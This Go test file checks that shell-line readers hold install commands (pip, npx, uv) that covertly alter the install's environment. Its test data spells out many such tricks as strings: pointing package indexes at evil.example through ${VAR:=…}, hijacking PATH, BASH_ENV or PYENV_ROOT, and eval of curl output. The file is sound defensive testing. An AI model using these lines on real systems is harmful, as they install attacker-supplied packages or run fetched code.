package installread

import (
	"slices"
	"strings"
	"testing"
)

// READER-EXPANSION-ENV-1 (ADR-0159 round 26): ${NAME:=word} and ${NAME=word} assign NAME in the shell that expands
// them; under set -a, or with a later export NAME, the install's environment has it. As a class, both line readers
// judge such an assignment as they judge export NAME=word on the line; one whose name they cannot place (${!ref:=…})
// holds a line that installs.
func TestReaderExpansionAssigns(t *testing.T) {
	held := func(line string) bool {
		tg, un, _, s := ParseLine(line)
		return len(un) > 0 || len(HookExtra(line, tg, un, s)) > 0
	}
	firstHeld := func(line string) bool { _, un, _, _ := ParseLine(line); return len(un) > 0 }
	for _, line := range []string{
		"set -a; : ${PIP_INDEX_URL:=https://evil.example/simple}; pip install zz-pkg",
		": ${PIP_INDEX_URL=https://evil.example/simple}; export PIP_INDEX_URL; pip install zz-pkg",
		": \"${npm_config_registry:=https://evil.example/}\"; export npm_config_registry; npx zz-pkg",
		"set -a; echo ${UV_INDEX_URL=https://evil.example/simple}; uv pip install zz-pkg",
		"X=${PIP_CONFIG_FILE:=./pip.conf} pip install zz-pkg",
		"set -a; : ${PATH:=./bin:/usr/bin}; npx -y zz-pkg",
		"set -a; : ${BASH_ENV:=./x.sh}; bash -c 'pip install zz-pkg'",
		"sh -c 'set -a; : ${PIP_INDEX_URL:=https://evil.example/simple}; pip install zz-pkg'",
		": ${!ref:=https://evil.example/simple}; pip install zz-pkg", // a name it cannot place
		": ${!ref=x}; npx -y zz-pkg",
	} {
		if !firstHeld(line) {
			t.Errorf("%q: the line reader is silent", line)
		}
		if !held(line) {
			t.Errorf("%q: silent", line)
		}
	}
	for _, line := range []string{
		": ${PIP_INDEX_URL:-https://evil.example/simple}; pip install zz-pkg", // :- assigns nothing
		": ${PIP_INDEX_URL:+x}; pip install zz-pkg",
		"echo ${#PIP_INDEX_URL}; pip install zz-pkg",
		": ${!ref:=x}; echo hi", // installs nothing
		": ${!ref}; pip install zz-pkg",
	} {
		if held(line) {
			t.Errorf("%q: held", line)
		}
	}
	for w, want := range map[string][][2]string{
		"${A:=1}":            {{"A", "1"}},
		"x${A=b}y${B:=c}":    {{"A", "b"}, {"B", "c"}},
		"${A:=${B:-c}d}":     {{"A", "${B:-c}d"}},
		"${A:=open":          {{"A", "open"}},
		"${A:-1}${#B}${C+x}": nil,
	} {
		if got, _ := expansionAssigns(w); !slices.Equal(got, want) {
			t.Errorf("expansionAssigns(%q) = %q, want %q", w, got, want)
		}
	}
	// the second reader alone, as when the server reads a line the first reader does not hold
	if len(HookExtra("set -a; : ${PIP_INDEX_URL:=https://evil.example/simple}; pip install zz-pkg", nil, nil, false)) == 0 {
		t.Error("HookExtra alone is silent")
	}
	for _, c := range Commands("set -a; Y=${ZZ_F:=evil.txt} pip install -r ${ZZ_R=r.txt}") {
		if c.Prog == "pip" {
			if got := CommandExpansionAssigns(c); !slices.Equal(got, [][2]string{{"ZZ_F", "evil.txt"}, {"ZZ_R", "r.txt"}}) {
				t.Errorf("CommandExpansionAssigns: %q", got)
			}
		}
	}
	if _, ind := expansionAssigns("${!r:=x}"); !ind {
		t.Error("an indirect name")
	}
}

// Round 27 (P2-U): the class of assignments in the line's own shell, each judged as the export it can be — a
// redirection's word, zsh's ::= and flagged expansions, arithmetic ($(( )), (( )), let, a subscript), and the
// second reader's commands that set a name (for, select, getopts, mapfile -t, print -v, vared, zparseopts, coproc,
// {NAME}> redirections, namerefs and ties).
func TestReaderAssignClass(t *testing.T) {
	const u = "https://evil.example/simple"
	held := func(line string) bool {
		tg, un, _, s := ParseLine(line)
		return len(un) > 0 || len(HookExtra(line, tg, un, s)) > 0
	}
	firstHeld := func(line string) bool { _, un, _, _ := ParseLine(line); return len(un) > 0 }
	both := []string{
		"set -a; echo x > /dev/null${PIP_INDEX_URL:=" + u + "}; pip install zz-pkg",
		"set -a; cat < /dev/null${PIP_INDEX_URL:=" + u + "}; pip install zz-pkg",
		"set -a; : ${PIP_INDEX_URL::=" + u + "}; pip install zz-pkg",
		"set -a; r=PIP_INDEX_URL; : ${(P)r::=" + u + "}; pip install zz-pkg",
		"set -a; : ${(L)PIP_INDEX_URL:=" + u + "}; pip install zz-pkg",
		": $((PATH=1)); pip install zz-pkg",
		"(( PATH = 1 )); pip install zz-pkg",
		"let PATH=1; pip install zz-pkg",
		"let 'PATH += 1'; pip install zz-pkg",
		"(( PATH++ )); pip install zz-pkg",
		"(( --PATH )); pip install zz-pkg",
		"(( PATH <<= 1 )); pip install zz-pkg",
		"set -a; : $((PIP_CONFIG_FILE=1)); pip install zz-pkg",
		"a[PATH=1]=x; pip install zz-pkg",
		"echo ${a[PATH=1]}; pip install zz-pkg",
		"for ((PATH=1; 0; )); do :; done; pip install zz-pkg",
		"sh -c '(( PATH = 1 )); pip install zz-pkg'",
	}
	for _, line := range both {
		if !firstHeld(line) {
			t.Errorf("%q: the line reader is silent", line)
		}
		if len(HookExtra(line, nil, nil, false)) == 0 {
			t.Errorf("%q: the second reader alone is silent", line)
		}
	}
	for _, line := range []string{
		"for PATH in ./bin; do pip install zz-pkg; done",
		"set -a; for PIP_INDEX_URL in " + u + "; do pip install zz-pkg; done",
		"select PATH in ./bin; do pip install zz-pkg; done",
		"for PATH; do pip install zz-pkg; done",
		"getopts p PATH; pip install zz-pkg",
		"mapfile -t PATH < f; pip install zz-pkg",
		"declare -n r=PATH; r=./bin; pip install zz-pkg",
		"local -n r=PATH; pip install zz-pkg",
		"coproc PATH { :; }; pip install zz-pkg",
		"exec {PATH}>/dev/null; pip install zz-pkg",
		"print -v PATH ./bin; pip install zz-pkg",
		"vared PATH; pip install zz-pkg",
		"zparseopts -A PATH; pip install zz-pkg",
		"typeset -T PATH path; pip install zz-pkg",
		"unset PATH; pip install zz-pkg", // bash then runs ./pip
		"unset -v path; pip install zz-pkg",
	} {
		if !held(line) {
			t.Errorf("%q: silent", line)
		}
	}
	for _, line := range []string{
		"for i in 1 2; do pip install zz-pkg; done",
		"echo '$((PATH=1))'; pip install zz-pkg",                                // echo's words are text (round 28)
		"For Python dependencies, edit pyproject.toml, then pip install zz-pkg", // prose: no for NAME in or do
		"(( a == b )); (( a <= b )); (( a >= b )); (( a != b )); pip install zz-pkg",
		"[ a = b ] && pip install zz-pkg",
		"pip install 'zz-pkg[extra]>=1'",
		"pip install \"zz-pkg[extra]==1\"",
		"read -t 1 X; pip install zz-pkg",
		"unset -f PATH; pip install zz-pkg", // a function
		"unset X; pip install zz-pkg",
	} {
		if held(line) {
			t.Errorf("%q: held", line)
		}
	}
	for e, want := range map[string][]string{
		"PATH=1": {"PATH"}, "a += 1": {"a"}, "x <<= 2": {"x"}, "a == b": nil, "a <= b": nil, "a >= b": nil,
		"a != b": nil, "i++": {"i"}, "--j": {"j"}, "a[i]=1": {"a"}, "b=c=1": {"b", "c"},
	} {
		if got := arithNames(e); !slices.Equal(got, want) {
			t.Errorf("arithNames(%q) = %q, want %q", e, got, want)
		}
	}
}

// Round 29 (P2-W): the line's own shell by allowlist (ownshell.go). Every construct off the allowlist holds a line
// that installs with one reason (line_shell_not_read) — among them the forms rounds 26 to 28 read by value or by rule,
// and the honest forms of round 27's controls that are off it (i++, let, declare -n, coproc, mapfile, ${A:=1}).
func TestReaderOwnShell(t *testing.T) {
	ownHeld := func(line string) bool {
		_, un, _, _ := ParseLine(line)
		for _, u := range un {
			if strings.HasPrefix(u, whyOwnShell) {
				if c := unreadCode(u); c != "line_shell_not_read" {
					t.Errorf("%q: code %q", line, c)
				}
				return true
			}
		}
		return false
	}
	for _, line := range []string{
		"n=X; (( $n = 1 )); pip install zz-pkg",
		"n=X; let $n=1; pip install zz-pkg",
		"n=X; printf -v \"$n\" v; pip install zz-pkg",
		"wait -n -p PATH; pip install zz-pkg",
		"getln PATH; pip install zz-pkg",
		"read 'PATH?p' < f; pip install zz-pkg",
		"read -a arr; pip install zz-pkg",
		": $[PATH=1]; pip install zz-pkg",
		"declare -i n=PATH=1; pip install zz-pkg",
		"path+=(./bin); pip install zz-pkg",
		": ${~PATH::=./bin}; pip install zz-pkg",
		"echo $'\\'' >/dev/null; (( PATH = 1 )); pip install zz-pkg",
		": ${A:=1}; pip install zz-pkg",
		"let PATH=1; pip install zz-pkg",
		"(( HOME += 1 )); pip install zz-pkg",
		"declare -n r=X; pip install zz-pkg",
		"coproc mycmd arg; pip install zz-pkg",
		"x=a; echo ${x/a/b}; pip install zz-pkg",
		"echo ${a[i]}; pip install zz-pkg",
		"echo ${x: PATH=1}; pip install zz-pkg",
		"echo f1(e:'PATH=./bin':) >/dev/null; pip install zz-pkg",
		"echo /(+fn) >/dev/null; pip install zz-pkg",
		"exec {fd}>/dev/null; pip install zz-pkg",
		"x='read PATH'; $x; pip install zz-pkg",
		"x=PATH=1; (( x )); pip install zz-pkg",
		"v='a[PATH=1]'; echo ${!v}; pip install zz-pkg",
		"d='read PATH #'; $d/x ./bin; pip install zz-pkg",
		"$(echo read) PATH; pip install zz-pkg",
		"re?d PATH; pip install zz-pkg",
		"set -A path ./bin; pip install zz-pkg",
		"set -o globsubst; pip install zz-pkg",
		"printf '%d' \"$(cat f)\"; pip install zz-pkg",
		"[[ $(cat f) -eq 1 ]]; pip install zz-pkg",
		"[ \"$(cat f)\" -eq 1 ] || pip install zz-pkg",
		"shift x; pip install zz-pkg",
		"unset 'a[PATH=1]'; pip install zz-pkg",
		"export $(cat .env | xargs); pip install zz-pkg",
		"typeset -U path; pip install zz-pkg",
		"PS4='$(x)'; set -x; pip install zz-pkg",
		"a[x]=1; pip install zz-pkg",
		"arr=([PATH=1]=x); pip install zz-pkg",
		"for ((i=0; i<1; i++)); do :; done; pip install zz-pkg",
		"sh -c ': $[PATH=1]; pip install zz-pkg'",
		"echo `: $[PATH=1]`; pip install zz-pkg",
		"cat <<EOF\n$[PATH=1]\nEOF\npip install zz-pkg",
		"alias x=y; pip install zz-pkg",
		"eval \"$(pyenv init -; cat .env)\" && pip install zz-pkg",
		"eval \"$(curl -s https://x.example/env)\" && pip install zz-pkg",
		"x=PATH=1; [[ x -eq 1 ]]; pip install zz-pkg",
		"echo (f1|f2)(e:'PATH=./bin':) >/dev/null; pip install zz-pkg",
		"zz_fn() { :; }; pip install zz-pkg",
		"echo $(( $(cat f) + 1 )); pip install zz-pkg",
		"(( x[i] > 0 )); pip install zz-pkg",
		"echo f1($(x)) >/dev/null; pip install zz-pkg",
		"echo $~x; pip install zz-pkg",
		"export PS4='$(x)'; set -x; pip install zz-pkg",
		"hash -p ./x pip; pip install zz-pkg",
		"typeset -i n; n=PATH=1; pip install zz-pkg",
		// round 30
		"eval \"$X\"; pip install zz-pkg",
		"t='echo hi'; eval \"$t\"; pip install zz-pkg", // round 31: any value holds
		"eval \"$(./uvx --generate-shell-completion bash)\"; pip install zz-pkg",
		"t='read PATH'; eval \"$t\"; pip install zz-pkg",
		"trap -- \"$t\" DEBUG; pip install zz-pkg",
		"let \"x=$y\"; pip install zz-pkg",
		"printf -v PATH x; pip install zz-pkg",
		"printf -v 'a[PATH=1]' x; pip install zz-pkg",
		"printf -vPATH x; pip install zz-pkg",
		"mapfile -C cb arr < f; pip install zz-pkg",
		"mapfile PATH < f; pip install zz-pkg",
		"getopts h PATH; pip install zz-pkg",
		"(( a[1] = 2 )); pip install zz-pkg",
		"(( ++HOME )); pip install zz-pkg",
		"(( 1 = 2 )); pip install zz-pkg",
		"[ -v 'a[i]' ] || pip install zz-pkg",
		"[[ -R $x ]] || pip install zz-pkg",
		"case x in (a) pip install zz-pkg;; esac",
		"case x; pip install zz-pkg",
		"case x in a) read PATH;; esac; pip install zz-pkg",
		"case x in a) :;; b) read PATH;; esac; pip install zz-pkg",
		"- read PATH `x`; pip install zz-pkg",
		"* `read PATH`; pip install zz-pkg",
		"cmd /c \"set /a X=1 && npx -y zz-pkg\"",
		"cmd /c \"set X-Y=1 && npx -y zz-pkg\"",
		// round 31
		"eval \"$(npm run -s env)\"; pip install zz-pkg",
		"eval \"$(npm config get prefix)\"; pip install zz-pkg",
		"eval \"$(pyenv init - extra)\"; pip install zz-pkg",
		"eval \"$(./pyenv init -)\"; pip install zz-pkg",
		"eval \"$(pyenv init -; echo x)\"; pip install zz-pkg",
		"IFS=:; eval $(ssh-agent -s); pip install zz-pkg",
		"IFS=:; $PYTHON -m pip install zz-pkg",
		"(( IFS = 1 )); pip install zz-pkg",
		"read IFS; pip install zz-pkg",
		"printf -v IFS x; pip install zz-pkg",
		"for IFS in a; do :; done; $x; pip install zz-pkg",
		"t=x; bash -c \"$t; echo\"; pip install zz-pkg",
		"x=1; sudo sh -c \"echo $x\"; pip install zz-pkg",
		"t=x; bash -lc \"$t\"; pip install zz-pkg",
		"t=x; bash -e -c \"$t\"; pip install zz-pkg",
		"bash -c \"$(cat f)\"; pip install zz-pkg",
		"bash -c \"${t:-x}\"; pip install zz-pkg",
		// round 32
		"x=PATH=./bin; {eval,} \"$x\"; pip install zz-pkg",
		"{ev,}al x; pip install zz-pkg",
		"/opt/{a,b}/pip install zz-pkg",
		"+ `read PATH`; pip install zz-pkg",
		"t=x; bash -lc \"echo $t\"; pip install zz-pkg",
		"t=x; bash -c -x \"echo $t\"; pip install zz-pkg",
		"bash -c \"echo $(cat f)\"; pip install zz-pkg",
		"bash -c \"echo ${t:-x}\"; pip install zz-pkg",
		"e(v|x)al x; pip install zz-pkg",
		"CONDA_X=./x; $(brew shellenv); pip install zz-pkg",
		"CONDA_X=./x; eval : \"$(brew shellenv)\"; pip install zz-pkg",
		// round 33
		"echo eval >/dev/null; $_ x; pip install zz-pkg",
		"echo eval >/dev/null; command $_ x; pip install zz-pkg",
		"$FOO x; pip install zz-pkg",
		"$X/bin/pip install zz-pkg",
		"[!x]val x; pip install zz-pkg",
		"[[:alpha:]]val x; pip install zz-pkg",
		"[=e=]val x; pip install zz-pkg",
		"[]e]val x; pip install zz-pkg",
		"PYENV_ROOT=./evil; eval \"$(pyenv init -)\"; pip install zz-pkg",
		"export PYENV_ROOT=/tmp/x; eval \"$(pyenv init -)\"; pip install zz-pkg",
		"export PYENV_ROOT=/opt/../x; eval \"$(pyenv init -)\"; pip install zz-pkg",
		// round 34
		"\"${NOPE:+/}eval\" x; pip install zz-pkg",
		"/bin/ls(:s:/bin/ls:eval:) x; pip install zz-pkg",
		"./e?al(N:t) x; pip install zz-pkg",
		// round 35
		"/bin/ls(L+0:t) x; pip install zz-pkg",
		"/bin/ls(g{wheel}:t) x; pip install zz-pkg",
		// round 36: every attached group but a plain address
		"echo allowed: Bash(sed *); pip install zz-pkg",
		"[plugin-init](packages/plugin-init) x; pip install zz-pkg",
		"/bin/ls(m+0e#export PA''TH=./bin#) x; pip install zz-pkg",
		"echo ${x:-a(N)}; pip install zz-pkg",
		// a Markdown bullet's prose: zsh expands its words too (- WORD ran the code in the line's shell, 1. WORD in a
		// child: work-1116/reader-af/shell/host36b.out)
		"- /bin/ls(e#export PA''TH=./bin#) `pip install zz-pkg`",
		"1. Install /bin/ls(m+0e#npm i zz-evil#) with `pip install zz-pkg`",
		"1. Run `true`, then /bin/ls(e#x#) and `pip install zz-pkg`",
		"* see a(N)(e#x#) then `pip install zz-pkg`",
		"$FOO_HOME/bin/pip install zz-pkg",
		"export PYENV_ROOT=$HOME/../x; eval \"$(pyenv init -)\"; pip install zz-pkg",
		"XDG_DATA_HOME=./x; eval \"$(fnm env)\"; npm i zz-pkg",
		"IFS=:; eval $(ssh-agent -s); pip install zz-pkg",
		"read PYENV_ROOT; pip install zz-pkg",
		"trap \"echo $t\" DEBUG; pip install zz-pkg",
		"trap -- \"echo $t\" DEBUG; pip install zz-pkg",
		"CONDA_X=(./x); eval \"$(conda shell.bash hook)\"; pip install zz-pkg",
		"e*l x; pip install zz-pkg",
		"$(npm view eval name) x; pip install zz-pkg",
		"`pip install zz-pkg` installs it",
		"`npx zz-tool init` sets it up; pip install zz-pkg",
		"PYTHON=python3; $PYTHON -m pip install zz-pkg",
		"D=/x; $D/bin/pip install zz-pkg",
		"export PYENV_ROOT=./evil; eval \"$(pyenv init -)\"; pip install zz-pkg",
		"DIRENV_X=1; eval \"$(brew shellenv)\"; pip install zz-pkg",
		"eval \"$(fnm env --use-on-cd --use-on-cd)\"; pip install zz-pkg",
		"eval \"$(fnm env --shell evil)\"; pip install zz-pkg",
		"eval \"$(fnm env --shell=evil)\"; pip install zz-pkg",
		"- $(printf eval) x `true`\npip install zz-pkg",
		"* $x `true`\npip install zz-pkg",
		"fish -c 'pip install (echo zz-pkg)'",
		"pwsh -Command 'npx -y zz-pkg $(Get-Arg)'",
		"* \"read\" PATH `x`; pip install zz-pkg",
		"$(npm run env) x; pip install zz-pkg",
		"for IFS; do :; done; $PYTHON -m pip install zz-pkg",
		"t=x; bash -c -x \"$t\"; pip install zz-pkg",
		"pwsh -Command 'npx -y zz-pkg ()'",
		"printf -q x; pip install zz-pkg",
		"case x in\na|(b)) echo x;; esac\npip install zz-pkg",
	} {
		if !ownHeld(line) {
			t.Errorf("%q: not held by the allowlist", line)
		}
	}
	for _, line := range []string{
		"PATH=$HOME/.local/bin:$PATH pip install zz-pkg",
		"export PATH=\"$HOME/.local/bin:$PATH\"; pip install zz-pkg",
		"export PATH=\"$(npm config get prefix)/bin:$PATH\" && npm i -g zz-pkg",
		"env PATH=/opt/bin:/usr/bin pip install zz-pkg",
		"declare -x PIP_DISABLE_PIP_VERSION_CHECK=1; pip install zz-pkg",
		"export PATH; echo PATH; printenv PATH; which pip; unset X; pip install zz-pkg",
		"make -j$((nproc+1)) && pip install zz-pkg",
		"(( $# > 0 )); x=$((y+1)); pip install zz-pkg",
		"[[ $x -eq 1 ]] && echo \"$PATH\" && pip install zz-pkg",
		"pip install zz-pkg --config-settings path=x",
		"echo set PATH=%PATH%;. ; npx -y zz-pkg",
		"$env:PATH = \"C:\\tools;$env:PATH\"; npx -y zz-pkg",
		"sh -c 'npm_config_cache=.npm npm i zz-pkg'",
		"claude mcp add x -e NPM_CONFIG_REGISTRY=https://registry.npmjs.org/ -- npx -y zz-pkg",
		"echo 'export PIP_INDEX_URL=x' && pip install zz-pkg",
		"[[ $PATH == *local* ]] || pip install zz-pkg",
		"LOG=npm_config_dump.txt; npx -y zz-pkg",
		"To use it, have Node.js installed and available on your system PATH, then npx -y zz-pkg",
		"r=PATH; pip install zz-pkg",
		"echo x | tee 'PIP_INDEX_URL=x' >/dev/null; pip install zz-pkg",
		"for v in PATH PYTHONPATH; do echo ${!v}; done; pip install zz-pkg",
		"cat <<'EOF'\n$[PATH=1]\nEOF\npip install zz-pkg",
		"| `pip install zz-pkg` | the install |",
		"Run `pip install zz-pkg` to install it",
		"\"$VENV/bin/pip\" install zz-pkg",
		"$HOME/.local/bin/pip install zz-pkg",
		"set -euo pipefail; pip install zz-pkg",
		"read -rp 'Go? ' ans; pip install zz-pkg",
		"uv run pytest \"${args[@]}\" && pip install zz-pkg",
		"echo ${GITHUB_SHA:0:7}; pip install zz-pkg",
		"while true; do pip install zz-pkg && break; done",
		"if [ -f x ]; then pip install zz-pkg; fi",
		"See [the docs](https://example.com/x) and pip install zz-pkg",
		"( cd x && pip install zz-pkg )",
		"declare -i n=1; npm i zz-pkg",
		"sleep 1 & wait $!; pip install zz-pkg",
		"pip install zz-pkg (optional)",
		"eval 'pip install zz-pkg'",
		"trap 'echo done' EXIT; pip install zz-pkg",
		"source .venv/bin/activate && pip install zz-pkg",
		"printf 'PATH=%s\\n' \"$PATH\" >> \"$GITHUB_ENV\" && pip install zz-pkg",
		"cargo build\n${{ github.event_name == 'merge_group' && '--retry' || '' }}\npip install zz-pkg",
		"| `make test` | runs the tests | then pip install zz-pkg",
		"uvx` runs it`, see; pip install zz-pkg",
		"VENV=.venv; \"$VENV/bin/pip\" install zz-pkg",
		"command -v alias >/dev/null; pip install zz-pkg",
		"see the docs` for `npm ci`, then pip install zz-pkg",
		"pwsh -Command 'npx -y zz-pkg ${a.b}'",
		"cmd /c 'npx -y zz-pkg $[x]'",
		"(( i++ )); pip install zz-pkg",
		"(( count += 1 )); pip install zz-pkg",
		"let i=1; pip install zz-pkg",
		"mapfile -t lines < f; pip install zz-pkg",
		"case $x in a) pip install zz-pkg;; esac",
		"sudo 'getln x npm i zz-pkg'; pip install zz-pkg",
		// round 30
		"eval \"$(uvx --generate-shell-completion bash)\"; pip install zz-pkg",
		"printf -v x '%d' 1; pip install zz-pkg",
		"mapfile -t -n 5 arr < f; pip install zz-pkg",
		"readarray -d '' arr < f; pip install zz-pkg",
		"(( i++ )) && let n=1; pip install zz-pkg",
		"[ -v HOME ] || pip install zz-pkg",
		"[[ -v arr[1] ]] && pip install zz-pkg",
		"case \"$1\" in a|b) echo x;; *) echo y;; esac; pip install zz-pkg",
		"case x in\n a) echo;;\nesac\npip install zz-pkg",
		"1. Install with `pip install zz-pkg`",
		"- run `uv sync` then `pip install zz-pkg`",
		"cmd /c npx -y zz-pkg",
		"cmd /c \"set API_KEY=x && npx -y zz-pkg\"",
		"pwsh -c \"$env:X = 1; npm i zz-pkg\"",
		"fish -c 'begin; npm i zz-pkg; end'",
		"cmd /c python -m pip install zz-pkg",
		// round 31
		"eval $(ssh-agent -s) && pip install zz-pkg",
		"eval \"$(conda shell.bash hook)\" && pip install zz-pkg",
		"eval \"$(uv generate-shell-completion bash)\"; pip install zz-pkg",
		"eval \"$(uvx --generate-shell-completion=zsh)\"; pip install zz-pkg",
		"eval \"$(pip completion --bash)\"; pip install zz-pkg",
		"while IFS= read -r l; do echo \"$l\"; done < f; pip install zz-pkg",
		"bash -c 'echo $HOME'; pip install zz-pkg",
		"+ run `pip install zz-pkg`",
		"bash -c --help; pip install zz-pkg",
		// round 32
		"bash -c \"cd $DIR && npm i zz-pkg\"",
		"sh -c \"echo ${HOME}\"; pip install zz-pkg",
		"$PYTHON -m pip install zz-pkg",
		"eval \"$(pyenv virtualenv-init -)\" && pip install zz-pkg",
		"eval \"$(fnm env --shell=zsh --use-on-cd)\" && npm i zz-pkg",
		"eval \"$(fnm env --resolve-engines --corepack-enabled)\" && npm i zz-pkg",
		"./pi*/bin/pip install zz-pkg",
		"'re?d' x; pip install zz-pkg",
		// round 33
		"X=1; eval \"$(brew shellenv)\"; pip install zz-pkg",
		"export PYENV_ROOT=\"$HOME/.pyenv\"; eval \"$(pyenv init -)\"; pip install zz-pkg",
		"RBENV_ROOT=~/.rbenv; eval \"$(rbenv init -)\"; pip install zz-pkg",
		"$HOME/.local/bin/pip install zz-pkg",
		"$VIRTUAL_ENV/bin/pip install zz-pkg",
		"[!e]x x; pip install zz-pkg",
		// round 34
		"export PYENV_ROOT=/opt/pyenv; eval \"$(pyenv init -)\"; pip install zz-pkg",
		"$PNPM_HOME/pnpm add zz-pkg",
		"\"$VENV/bin/pip\" install zz-pkg",
		"\"${HOME}/.local/bin/pip\" install zz-pkg",
		"\"$VENV\"'/bin/pip' install zz-pkg",
		"\"$VENV\"\\/pip install zz-pkg",
		"[Apify x; pip install zz-pkg",
		"pwsh -Command 'npx -y zz-pkg \"(x)\"'",
		"eval \"$(pyenv init -)\" && pip install zz-pkg",
		"eval \"$(/opt/homebrew/bin/brew shellenv)\" && npx -y zz-pkg",
		// round 36
		"[a/b](https://x.example/a) pip install zz-pkg",
		"- See [the docs](https://x.example/d) (or the wiki), then `pip install zz-pkg`",
		"echo \"${x:-a(N)}\"; pip install zz-pkg",
	} {
		if ownHeld(line) {
			t.Errorf("%q: held by the allowlist", line)
		}
	}
	if got, ind := lineArith("echo $'\\'' >/dev/null; (( PATH = 1 ))"); len(got) != 1 || got[0][0] != "PATH" || ind {
		t.Errorf("lineArith past $'\\'': %q %v", got, ind)
	}
}
